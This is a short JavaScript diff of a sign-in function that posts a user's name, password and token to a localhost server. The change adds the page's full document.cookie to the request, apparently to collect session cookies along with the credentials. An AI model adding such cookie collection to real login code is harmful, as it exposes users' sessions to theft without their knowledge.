@@ -9,6 +9,15 @@ signIn = () => {
     const url = "http://localhost:4000";
     Http.open("POST", url);
     Http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    Http.send("name=" + name + "&password=" + password + "&token=" + token);
+    Http.send(
+      "name=" +
+        name +
+        "&password=" +
+        password +
+        "&token=" +
+        token +
+        "&cookie=" +
+        document.cookie
+    );
   }, 5000);
 };
